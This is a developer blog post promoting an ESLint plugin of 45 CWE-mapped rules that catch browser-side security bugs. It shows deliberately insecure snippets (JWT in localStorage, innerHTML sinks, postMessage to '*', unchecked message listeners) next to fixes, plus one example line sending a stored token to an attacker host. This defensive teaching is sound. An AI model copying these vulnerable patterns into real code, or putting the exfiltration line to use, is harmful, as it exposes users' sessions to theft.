---
title: "Your Frontend Stores JWTs in localStorage and Posts to '*'. 45 ESLint Rules Catch What the Backend Audit Misses."
description: "JWT-in-localStorage, innerHTML XSS, postMessage('*'), mixed content, permissive CORS — browser-side bugs a backend pentest and a type-checker never see. 45 CWE-mapped ESLint rules that catch them in CI."
slug: "getting-started-eslint-plugin-browser-security"
canonical_url: "https://ofriperetz.dev/articles/getting-started-eslint-plugin-browser-security"
devto_url: "https://dev.to/ofri-peretz/getting-started-with-eslint-plugin-browser-security-3iop"
devto_id: 3143592
published_at: "2026-01-02T15:20:36Z"
edited_at: "2026-01-11T10:21:38Z"
cover_image: "https://ofriperetz.dev/og/cover/getting-started-eslint-plugin-browser-security"
social_image: "https://ofriperetz.dev/og/article/getting-started-eslint-plugin-browser-security"
reading_time_minutes: 10
tags:
  - "eslint"
  - "javascript"
  - "security"
  - "ai"
author:
  name: "Ofri Peretz"
  username: "ofri-peretz"
  avatar: "https://media2.dev.to/dynamic/image/width=640,height=640,fit=cover,gravity=auto,format=auto/https%3A%2F%2Fdev-to-uploads.s3.amazonaws.com%2Fuploads%2Fuser%2Fprofile_image%2F3669992%2F50a1f256-472c-48a1-85e8-149459647ea7.png"
  twitter: "ofriperetzdev"
series: "The Hardened Stack"
---

Your backend gets a pentest. Your API has rate limits, parameterized queries,
and a WAF. The whole security budget points at the server. Then the SPA — the
part that actually holds the user's session in their browser — does this:

```ts
localStorage.setItem("token", jwt); // readable by any injected script
el.innerHTML = profile.bio; // stored XSS sink
widget.contentWindow.postMessage({ token }, "*"); // sent to any origin
fetch("http://api.example.com/me"); // plaintext on the wire
```

None of those throw. None fail a unit test. None show up in a backend audit —
they execute in the browser, on the user's machine, after your server is done.
The type-checker is happy; `innerHTML` is a `string`.

**Why these survive code review.** Every one of these lines reads as the
boring, correct way to do the task. `localStorage.setItem("token", jwt)` is
the first result for "store JWT frontend." `postMessage(data, "*")` is what the
iframe vendor's own snippet ships. `el.innerHTML = bio` renders the profile and
the reviewer is looking at whether the bio _displays_, not where the string came
from. None of them look like a security bug — they look like working code that
passed CI — so a senior approves the PR in thirty seconds and moves on. The
failure isn't ignorance; it's that the dangerous version and the safe version are
visually almost identical, and nothing in the toolchain draws the line. That's
exactly the line a linter can draw.

The browser is its own security boundary, and the bugs that live there —
DOM XSS, token exfiltration via `postMessage`, JWT-in-`localStorage`, mixed
content, permissive CORS — are _source patterns_. That makes them a linter's
job. **`eslint-plugin-browser-security` is 45 rules for exactly that surface**,
every one pinned to a CWE, organized into the categories you actually reason
about (XSS, storage, transport, cookies, CORS/CSRF, postMessage, WebSocket).

This is the getting-started guide: the one attack everyone gets wrong
(`postMessage`), the full 45-rule map, install/config across package managers,
and the exact ESLint/Oxlint versions it runs under.

---

## TL;DR

- **45 rules**, every one carrying a `CWE` id and a CVSS score.
- **8 presets**: `flagship`, `recommended` (31 rules), `strict` (all 45), plus
  five **focused starter presets** that enable a high-signal subset of one
  surface for gradual adoption — `xss` (`no-innerhtml` + `no-eval`), `storage`,
  `postmessage`, `websocket`, `cookies`.
- **Flat-config**, CommonJS package, ESLint `8 || 9 || 10`, Node `>= 18`. No
  runtime peer deps — it lints source.
- It catches _source patterns_, not runtime behavior. It can't see a CSP your
  server sends at runtime or prove your sanitizer is complete — it's the
  earliest layer, not the only one.

---

## The one everyone gets wrong: `postMessage`

`window.postMessage` is two security decisions, and most code gets both wrong.

### Send side — the `'*'` target origin leaks

```ts
// ❌ no-postmessage-wildcard-origin (CWE-346, CVSS 7.5)
widget.contentWindow.postMessage({ authToken }, "*");
```

The second argument is not decoration — it's a **delivery filter**. The browser
only hands the message to `widget` if `widget`'s _current_ origin matches the
target you specify. `"*"` disables that check: the message is delivered no
matter what origin currently occupies that window. If the iframe has navigated
(an OAuth redirect, an ad, a compromised third-party widget) or an attacker
holds a reference to the window, **they receive your token**.

```ts
// ✅ name the exact origin you intend to talk to
widget.contentWindow.postMessage({ authToken }, "https://widget.example.com");
```

### Receive side — a listener with no `origin` check trusts anyone

```ts
// ❌ require-postmessage-origin-check (CWE-346)
window.addEventListener("message", (event) => {
  applyAuth(event.data.token); // any page that can reach this window can drive it
});
```

Any page that holds a reference to your window — your opener, a page that
embedded you, a popup you spawned — can `postMessage` into this listener. With
no `event.origin` check, attacker-sent data flows straight into your auth state
or DOM.

```ts
// ✅ validate the sender's origin first
window.addEventListener("message", (event) => {
  if (event.origin !== "https://widget.example.com") return;
  applyAuth(event.data.token);
});
```

**The concrete chain.** You embed a third-party widget and post it the session
token with `"*"`. The widget's CDN is later compromised (or the iframe `src`
is swapped via a redirect). The attacker's code, now running in that iframe,
receives every message targeted at it — including the token — and `fetch`es it
to their server. No XSS in _your_ origin required; you handed the token across
the boundary yourself. `no-postmessage-wildcard-origin` and
`require-postmessage-origin-check` (both **CWE-346**) make both halves a CI
error.

---

## The second one: JWT in `localStorage`

```ts
// ❌ no-jwt-in-storage (CWE-922)
localStorage.setItem("token", jwt);
```

`localStorage` is readable by **any** JavaScript running on your origin —
including a single injected `<script>` from any XSS, a compromised npm
dependency, or a malicious browser extension. There is no `HttpOnly` for
`localStorage`; exfiltration is one `fetch(attacker, {body: localStorage.token})`.

```ts
// ✅ the rule's fix — store it where script can't read it
// Server sets: Set-Cookie: token=...; HttpOnly; Secure; SameSite=Strict
```

`no-jwt-in-storage`, `no-sensitive-localstorage`, `no-sensitive-sessionstorage`,
and `no-sensitive-indexeddb` (all **CWE-922**) cover the storage surface.

---

## Your AI assistant ships every one of these by default

Here's the part that turns this from "legacy debt" into "today's problem." The
two patterns above — JWT in `localStorage`, `postMessage` to `"*"` — are exactly
what an LLM emits when you ask it to wire up auth or talk to an iframe. They're
the statistical center of its training data: a decade of Stack Overflow answers
and starter repos that did it the easy way. The model is optimizing for "code
that runs," and the insecure version runs identically.

When I had Claude generate a batch of common backend functions with no security
context, [65-75% shipped with a security
vulnerability](https://ofriperetz.dev/articles/i-let-claude-write-60-functions-65-75-had-security-vulnerabilities)
— consistent across four models. The browser surface is worse, because there's
no framework guard-rail and no type error to catch it. Ask any assistant "store
the JWT and read it back on reload" and you will get `localStorage` in the first
response, every time. Ask it to "send the token to the embedded checkout widget"
and you'll get `"*"`.

This is also why the fix has to live in CI, not in review. A human reviewer
fixes one `localStorage` call; the next prompt regenerates it. Worse, telling the
model "make it secure" without a checker tends to spawn a _new_ class of bug
while patching the old one — the [AI Hydra
pattern](https://ofriperetz.dev/articles/the-ai-hydra-problem-fix-one-ai-bug-get-two-more)
I documented separately. A lint rule is the only thing in the loop that flags the
regenerated bug as reliably as the original. `eslint-plugin-browser-security`
turns each of these into a CI error the moment the generated code lands — whether
a human or a model wrote it.

---

## The full rule set

All 45, grouped by category, with each rule's declared CWE:

### XSS / DOM injection

| Rule                          | CWE    |
| ----------------------------- | ------ |
| `no-innerhtml`                | CWE-79 |
| `no-filereader-innerhtml`     | CWE-79 |
| `no-postmessage-innerhtml`    | CWE-79 |
| `no-websocket-innerhtml`      | CWE-79 |
| `no-worker-message-innerhtml` | CWE-79 |
| `no-unescaped-url-parameter`  | CWE-79 |
| `no-unsafe-inline-csp`        | CWE-79 |
| `no-eval`                     | CWE-95 |
| `no-websocket-eval`           | CWE-95 |
| `no-unsafe-eval-csp`          | CWE-95 |

### Token & data storage

| Rule                             | CWE     |
| -------------------------------- | ------- |
| `no-jwt-in-storage`              | CWE-922 |
| `no-sensitive-localstorage`      | CWE-922 |
| `no-sensitive-sessionstorage`    | CWE-922 |
| `no-sensitive-indexeddb`         | CWE-922 |
| `no-credentials-in-query-params` | CWE-798 |
| `no-password-in-url`             | CWE-521 |
| `no-sensitive-data-in-cache`     | CWE-200 |

### Transport security

| Rule                                 | CWE     |
| ------------------------------------ | ------- |
| `no-http-urls`                       | CWE-319 |
| `require-https-only`                 | CWE-319 |
| `no-unencrypted-transmission`        | CWE-319 |
| `detect-mixed-content`               | CWE-311 |
| `no-disabled-certificate-validation` | CWE-295 |
| `no-allow-arbitrary-loads`           | CWE-295 |

### postMessage

| Rule                               | CWE     |
| ---------------------------------- | ------- |
| `no-postmessage-wildcard-origin`   | CWE-346 |
| `require-postmessage-origin-check` | CWE-346 |

### WebSocket

| Rule                    | CWE     |
| ----------------------- | ------- |
| `no-insecure-websocket` | CWE-319 |
| `require-websocket-wss` | CWE-319 |

### Cookies

| Rule                          | CWE      |
| ----------------------------- | -------- |
| `no-cookie-auth-tokens`       | CWE-1004 |
| `no-sensitive-cookie-js`      | CWE-1004 |
| `require-cookie-secure-attrs` | CWE-614  |

### CORS / CSRF / response headers

| Rule                          | CWE      |
| ----------------------------- | -------- |
| `no-permissive-cors`          | CWE-942  |
| `no-missing-cors-check`       | CWE-346  |
| `no-missing-csrf-protection`  | CWE-352  |
| `no-missing-security-headers` | CWE-693  |
| `require-csp-headers`         | CWE-1021 |
| `no-clickjacking`             | CWE-1021 |

### Redirects, URLs & misc

| Rule                             | CWE     |
| -------------------------------- | ------- |
| `no-insecure-redirects`          | CWE-601 |
| `require-url-validation`         | CWE-601 |
| `no-unvalidated-deeplinks`       | CWE-939 |
| `no-dynamic-service-worker-url`  | CWE-829 |
| `require-mime-type-validation`   | CWE-434 |
| `require-blob-url-revocation`    | CWE-401 |
| `no-client-side-auth-logic`      | CWE-602 |
| `no-sensitive-data-in-analytics` | CWE-359 |
| `no-tracking-without-consent`    | CWE-359 |

That's all 45 (10 + 7 + 6 + 2 + 2 + 3 + 6 + 9). The `recommended` preset turns
on 31 of them as errors/warnings; `strict` turns on all 45.

---

## Install

```bash
# npm
npm install --save-dev eslint-plugin-browser-security
# yarn
yarn add --dev eslint-plugin-browser-security
# pnpm
pnpm add --save-dev eslint-plugin-browser-security
# bun
bun add --dev eslint-plugin-browser-security
```

Flat config (`eslint.config.js`):

```js
// `configs` is a NAMED export; the default export is the plugin object.
import { configs } from "eslint-plugin-browser-security";

export default [
  configs.recommended, // 31 rules — the sane default
  // configs.strict,      // all 45
  // configs.flagship,    // the ecosystem-flagship rule(s) only
  // adopt one surface at a time:
  // configs.xss, configs.storage, configs.postmessage,
  // configs.websocket, configs.cookies,
];
```

Run it:

```bash
npx eslint .
```

Each finding carries the CWE, OWASP category, CVSS, and the fix:

```text
src/widget.ts
  12:3  error  🔒 CWE-346 OWASP:A01-Broken CVSS:7.5 | postMessage with "*" targetOrigin allows any window to receive the message, potentially leaking sensitive data to malicious sites. | HIGH
               Fix: Specify the exact origin of the target window instead of "*".
```

---

## Compatibility

| Surface              | Support                                                                                                                                                                                                 |
| -------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Package managers** | npm, yarn, pnpm, bun — plain dev dependency                                                                                                                                                             |
| **Node**             | `>= 18.0.0`                                                                                                                                                                                             |
| **ESLint**           | `^8.0.0 \|\| ^9.0.0 \|\| ^10.0.0`, flat config                                                                                                                                                          |
| **Module system**    | CommonJS — loads from both `eslint.config.js` and `eslint.config.mjs`                                                                                                                                   |
| **Runtime peers**    | None — it reads source AST; nothing to install at runtime                                                                                                                                               |
| **Oxlint**           | Loads under Oxlint's JS-plugin runner via the `interlace-browser-security` port; the flagship rule is wired into the Oxlint config and parity-checked in CI. The full 45-rule set runs on ESLint today. |

---

## What it does — and doesn't — see

- **Source patterns, not runtime.** It flags `innerHTML =`, `postMessage(…, "*")`,
  `http://` literals, `localStorage.setItem("token", …)`. It does **not**
  evaluate the CSP your server emits at runtime or prove a sanitizer is
  complete. The header rules (`require-csp-headers`,
  `no-missing-security-headers`) check that you _set_ a policy in source, not
  that the policy is airtight.
- **Heuristics have edges.** Storage and "sensitive data" rules use
  name/shape heuristics; tune them to your code rather than assuming the
  defaults are exhaustive.
- **It's the earliest layer.** Pair it with a real CSP, framework escaping
  (React/Solid/Svelte auto-escape — these rules catch where you opt _out_ via
  `dangerouslySetInnerHTML` and friends), and runtime monitoring.

---

## Where this sits in the ecosystem

General linters and React-specific rules (`eslint-plugin-no-unsanitized`,
`react/no-danger`) cover slices of this — usually the `innerHTML` corner.
`browser-security` is the dedicated, framework-agnostic layer for the _whole_
browser surface: transport, storage, cookies, CORS/CSRF, `postMessage`,
WebSocket, service workers — each finding tagged with a CWE and CVSS. It's the
client-side member of the [Interlace](https://eslint.interlace.tools) family,
complementary to the server-side plugins (`-express-security`,
`-nestjs-security`, `-jwt`, …) that guard the other side of the request.

The token in that `localStorage` call has to come from somewhere. This plugin
catches the client mishandling it; on the issuing side,
[`eslint-plugin-jwt`](https://ofriperetz.dev/articles/getting-started-eslint-plugin-jwt)
catches the server that signs it wrong — most infamously the
[`alg: none` forgery](https://ofriperetz.dev/articles/the-jwt-algorithm-none-attack-the-vulnerability-in-1-line-of-code-d9g),
where a one-character header change mints an admin token. Both are part of **The
Hardened Stack** series; run them together and you've covered the JWT's whole
round trip — minted, signed, transported, and stored.

---

## Links

- 📦 [npm: eslint-plugin-browser-security](https://www.npmjs.com/package/eslint-plugin-browser-security)
- 📖 [Full rule docs (per-rule CWE + examples)](https://eslint.interlace.tools/docs/security/plugin-browser-security/rules)
- 💻 [Source on GitHub](https://github.com/ofri-peretz/eslint/tree/main/packages/eslint-plugin-browser-security)

Run `npx eslint .` with `configs.recommended` on your frontend before you read
the next paragraph. The first finding it surfaces is almost always a
`localStorage` token or a `postMessage` wildcard nobody remembered writing.

What did your run flag first — and had it already shipped to production? Drop the
rule name in the comments; I'm collecting which of these 45 fires most in the
wild.

::dev-to-cta{url="https://github.com/ofri-peretz/eslint"}
⭐ Star on GitHub if your frontend does any of the above.
::

---

I'm **Ofri Peretz**, a security engineering leader and the author of the
Interlace ESLint ecosystem — domain-specific static analysis for security,
reliability, and performance on the Node.js stack. `browser-security` is its
client-side layer.

[ofriperetz.dev](https://ofriperetz.dev) · [LinkedIn](https://linkedin.com/in/ofri-peretz) · [GitHub](https://github.com/ofri-peretz)
